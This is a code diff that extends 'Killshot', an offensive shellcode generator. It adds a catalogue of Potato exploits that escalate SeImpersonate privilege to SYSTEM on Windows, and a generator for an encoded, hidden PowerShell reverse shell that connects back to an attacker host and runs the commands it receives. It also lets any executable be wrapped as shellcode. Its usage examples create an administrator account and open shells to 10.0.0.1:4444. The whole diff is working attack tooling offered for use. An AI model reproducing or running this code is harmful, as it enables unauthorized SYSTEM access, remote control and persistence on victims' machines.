@@ -179,6 +179,46 @@ def find_tool(name, script_dir):
     return None
 
 
+POTATOES = {
+    "GodPotato": {
+        "paths": _pot_paths("GodPotato.exe"),
+        "cmd_template": '-cmd "{cmd}"',
+        "desc": "SeImpersonate→SYSTEM via RPC | Win10/11, Server 2012-2022",
+        "requires": "SeImpersonatePrivilege",
+    },
+    "PrintSpoofer": {
+        "paths": _pot_paths("PrintSpoofer.exe"),
+        "cmd_template": '-i -c "{cmd}"',
+        "desc": "SpoolFool → SYSTEM | Win10, Server 2016-2022",
+        "requires": "SeImpersonatePrivilege",
+    },
+    "JuicyPotatoNG": {
+        "paths": _pot_paths("JuicyPotatoNG.exe"),
+        "cmd_template": '-t * -p "cmd.exe" -a "/c {cmd}"',
+        "desc": "COM hijack → SYSTEM, no BITS needed | Win10/11, Server 2019/2022",
+        "requires": "SeImpersonatePrivilege",
+    },
+    "SweetPotato": {
+        "paths": _pot_paths("SweetPotato.exe"),
+        "cmd_template": '-e EfsPotato -p "cmd.exe" -a "/c {cmd}"',
+        "desc": "Multi-technique (EfsPotato+PrintSpoofer) → SYSTEM | Win10, Server 2016-2022",
+        "requires": "SeImpersonatePrivilege",
+    },
+    "BadPotato": {
+        "paths": _pot_paths("BadPotato.exe"),
+        "cmd_template": '"{cmd}"',
+        "desc": "Named pipe SeImpersonate → SYSTEM | Win10, Server 2016-2019",
+        "requires": "SeImpersonatePrivilege",
+    },
+    "EfsPotato": {
+        "paths": _pot_paths("EfsPotato.exe"),
+        "cmd_template": '"{cmd}"',
+        "desc": "EFS RPC → SYSTEM | Win10, Server 2016-2019",
+        "requires": "SeImpersonatePrivilege",
+    },
+}
+
+
 def find_donut_python():
     for pypath in ["/opt/tools/Empire/venv/bin/python3", sys.executable]:
         if os.path.isfile(pypath):
@@ -194,15 +234,50 @@ def find_donut_python():
     return None
 
 
-def generate(tool_name, params, output_path, script_dir):
-    tool_path = find_tool(tool_name, script_dir)
-    if not tool_path:
-        print(f"[!] {tool_name} not found")
-        return False
+def gen_ps_revshell(lhost, lport):
+    """Generate a PS reverse shell one-liner encoded for -enc flag."""
+    ps = (
+        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
+        "$s=$c.GetStream();"
+        "[byte[]]$b=0..65535|%{0};"
+        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
+        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
+        "$r=(iex $d 2>&1|Out-String);"
+        "$r2=$r+'PS '+(pwd).Path+'> ';"
+        "$sb=([text.encoding]::ASCII).GetBytes($r2);"
+        "$s.Write($sb,0,$sb.Length);$s.Flush()};"
+        "$c.Close()"
+    )
+    enc = base64.b64encode(ps.encode('utf-16-le')).decode()
+    return f"powershell -nop -w hidden -enc {enc}"
 
-    info = TOOLS[tool_name]
-    if not params:
-        params = info["default_params"]
+
+def find_potato(name, script_dir):
+    info = POTATOES.get(name)
+    if not info:
+        return None
+    for p in info["paths"]:
+        p = p.format(script_dir=script_dir)
+        if os.path.isfile(p):
+            return p
+    return None
+
+
+def generate(tool_name, params, output_path, script_dir, exe_path=None):
+    if exe_path:
+        tool_path = os.path.abspath(exe_path)
+        if not os.path.isfile(tool_path):
+            print(f"[!] File not found: {tool_path}")
+            return False
+    else:
+        tool_path = find_tool(tool_name, script_dir)
+        if not tool_path:
+            print(f"[!] {tool_name} not found")
+            return False
+        tool_path = os.path.abspath(tool_path)
+        info = TOOLS[tool_name]
+        if not params:
+            params = info["default_params"]
 
     print(f"[*] Tool: {tool_path}")
     print(f"[*] Params: {params or '(none)'}")
@@ -273,17 +348,61 @@ else:
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='Offensive Tool Shellcode Generator')
-    parser.add_argument('--tool', '-t', help='Tool name (see --list)')
-    parser.add_argument('--params', '-p', default=None,
-                        help='Tool arguments (overrides defaults)')
+    parser = argparse.ArgumentParser(
+        description='Killshot — Offensive Tool Shellcode Generator',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  # Built-in tools
+  killshot.py --tool SharpHound --params "-c All" -o sharphound.enc
+  killshot.py --tool ligolo-agent --lhost 10.0.0.1 -o ligolo.enc
+
+  # Potato privesc — command execution
+  killshot.py --potato GodPotato --cmd "net user administrator Password123!"
+  killshot.py --potato PrintSpoofer --cmd "cmd /c whoami > C:\\\\Temp\\\\out.txt"
+
+  # Potato privesc — reverse shell (auto-generated PS revshell)
+  killshot.py --potato GodPotato --reverse-shell --lhost 10.0.0.1 --lport 4444
+  killshot.py --potato JuicyPotatoNG --reverse-shell --lhost 10.0.0.1 --lport 4444
+
+  # Custom exe — convert any .exe to shellcode
+  killshot.py --exe /path/to/tool.exe --params "-arg value" -o tool.enc
+  killshot.py --exe /path/to/GodPotato.exe --cmd "whoami" --template '-cmd "{cmd}"'
+  killshot.py --exe /path/to/tool.exe --reverse-shell --lhost 10.0.0.1 --lport 4444 --template '-c "{cmd}"'
+"""
+    )
+
+    # Source: tool, potato, or custom exe
+    src = parser.add_mutually_exclusive_group()
+    src.add_argument('--tool', '-t', help='Built-in tool name (see --list)')
+    src.add_argument('--potato', choices=list(POTATOES.keys()),
+                     help='Potato exploit (see --list)')
+    src.add_argument('--exe', help='Path to any .exe to convert to shellcode')
+
+    # Param sources (mutually exclusive)
+    pgrp = parser.add_mutually_exclusive_group()
+    pgrp.add_argument('--params', '-p', default=None,
+                      help='Raw args passed to the tool via donut (overrides defaults)')
+    pgrp.add_argument('--cmd', default=None,
+                      help='Command to execute (formatted via tool cmd_template)')
+    pgrp.add_argument('--reverse-shell', action='store_true',
+                      help='Auto-generate PS reverse shell as the command')
+
+    # Reverse shell / template options
+    parser.add_argument('--lhost', default=None,
+                        help='Attacker IP (reverse shell or ligolo connect-back)')
+    parser.add_argument('--lport', default='4444',
+                        help='Reverse shell port (default: 4444)')
+    parser.add_argument('--template', default=None,
+                        help='Arg template for --cmd/--reverse-shell with --exe (e.g. \'--cmd "{cmd}"\')')
+
+    # Output / misc
     parser.add_argument('--output', '-o', default=None, help='Output .enc file path')
     parser.add_argument('--script-dir', '-s', default='.', help='Script directory')
-    parser.add_argument('--list', action='store_true', help='List available tools')
+    parser.add_argument('--list', action='store_true', help='List all tools and potatoes')
+    parser.add_argument('--list-potatoes', action='store_true', help='List potato exploits')
     parser.add_argument('--all', '-a', action='store_true',
-                        help='Generate all available tools')
-    parser.add_argument('--lhost', default=None,
-                        help='Listener host (for ligolo-agent connect-back)')
+                        help='Generate all available built-in tools')
     parser.add_argument('--ligolo-port', default='11601',
                         help='Ligolo listener port (default: 11601)')
     parser.add_argument('--workspace', '-w', default='/workspace',
@@ -292,14 +411,31 @@ if __name__ == '__main__':
 
     script_dir = args.script_dir or os.path.dirname(os.path.abspath(__file__))
 
-    if args.list:
-        print("Available tools:")
-        for name, info in TOOLS.items():
-            path = find_tool(name, script_dir)
+    # ── --list ──────────────────────────────────────────────────
+    if args.list or args.list_potatoes:
+        if args.list:
+            print("\nBuilt-in tools (--tool):")
+            for name, info in TOOLS.items():
+                path = find_tool(name, script_dir)
+                status = f"found: {path}" if path else "NOT FOUND"
+                print(f"  {name:15s} - {info['desc']:45s} [{status}]")
+
+        print("\nPotato exploits (--potato):")
+        for name, info in POTATOES.items():
+            path = find_potato(name, script_dir)
             status = f"found: {path}" if path else "NOT FOUND"
-            print(f"  {name:15s} - {info['desc']:40s} [{status}]")
+            print(f"  {name:15s} - {info['desc']}")
+            print(f"  {'':15s}   Requires: {info['requires']:30s} [{status}]")
+            print(f"  {'':15s}   Template: {info['cmd_template']}")
+
+        print("\nUsage examples:")
+        print("  killshot.py --potato GodPotato --cmd \"net user administrator Password123!\"")
+        print("  killshot.py --potato GodPotato --reverse-shell --lhost 10.0.0.1 --lport 4444")
+        print("  killshot.py --exe /path/custom.exe --params \"-arg value\"")
+        print("  killshot.py --exe /path/potato.exe --cmd \"whoami\" --template '-cmd \"{cmd}\"'")
         sys.exit(0)
 
+    # ── --all (built-in tools only) ─────────────────────────────
     if args.all:
         ws = args.workspace
         ok = 0
@@ -307,9 +443,8 @@ if __name__ == '__main__':
         for name in TOOLS:
             lower = name.lower().replace("-", "_")
             out = os.path.join(ws, f"{lower}.enc")
-            params = args.params  # global override
+            params = args.params
 
-            # Special handling for ligolo-agent
             if name == "ligolo-agent":
                 if not args.lhost:
                     print(f"[!] Skipping ligolo-agent (need --lhost)")
@@ -324,6 +459,56 @@ if __name__ == '__main__':
         print(f"\n[*] Done: {ok} generated, {fail} failed/skipped")
         sys.exit(0 if fail == 0 else 1)
 
+    # ── Resolve cmd string ───────────────────────────────────────
+    cmd_str = None
+    if args.reverse_shell:
+        if not args.lhost:
+            print("[!] --reverse-shell requires --lhost")
+            sys.exit(1)
+        cmd_str = gen_ps_revshell(args.lhost, int(args.lport))
+        print(f"[*] Reverse shell: {args.lhost}:{args.lport}")
+    elif args.cmd:
+        cmd_str = args.cmd
+
+    # ── --potato ────────────────────────────────────────────────
+    if args.potato:
+        info = POTATOES[args.potato]
+        potato_path = find_potato(args.potato, script_dir)
+        if not potato_path:
+            print(f"[!] {args.potato}.exe not found — run: ./install.sh --tools-only")
+            sys.exit(1)
+        if not cmd_str:
+            print(f"[!] --potato requires --cmd or --reverse-shell")
+            print(f"    Template: {info['cmd_template']}")
+            sys.exit(1)
+        params = info["cmd_template"].format(cmd=cmd_str)
+        output = args.output or f"{args.potato.lower()}.enc"
+        print(f"[*] Potato: {args.potato} | Requires: {info['requires']}")
+        if not generate(args.potato, params, output, script_dir, exe_path=potato_path):
+            sys.exit(1)
+        sys.exit(0)
+
+    # ── --exe ────────────────────────────────────────────────────
+    if args.exe:
+        exe_path = args.exe
+        if not os.path.isfile(exe_path):
+            print(f"[!] File not found: {exe_path}")
+            sys.exit(1)
+
+        if cmd_str is not None:
+            if args.template:
+                params = args.template.format(cmd=cmd_str)
+            else:
+                params = cmd_str
+        else:
+            params = args.params  # may be None for tools that take no args
+
+        output = args.output or (os.path.splitext(os.path.basename(exe_path))[0] + ".enc")
+        if not generate(None, params, output, script_dir, exe_path=exe_path):
+            sys.exit(1)
+        sys.exit(0)
+
+    # ── --tool (existing) ────────────────────────────────────────
     if not args.tool:
         parser.print_help()
         sys.exit(1)
@@ -333,9 +518,6 @@ if __name__ == '__main__':
         print(f"    Available: {', '.join(TOOLS.keys())}")
         sys.exit(1)
 
-    output = args.output or f"{args.tool.lower()}.enc"
-
-    # Special handling for ligolo-agent
     params = args.params
     if args.tool == "ligolo-agent" and not params:
         if args.lhost:
@@ -344,5 +526,6 @@ if __name__ == '__main__':
             print("[!] ligolo-agent requires --params or --lhost for connect-back")
             sys.exit(1)
 
+    output = args.output or f"{args.tool.lower()}.enc"
     if not generate(args.tool, params, output, script_dir):
         sys.exit(1)
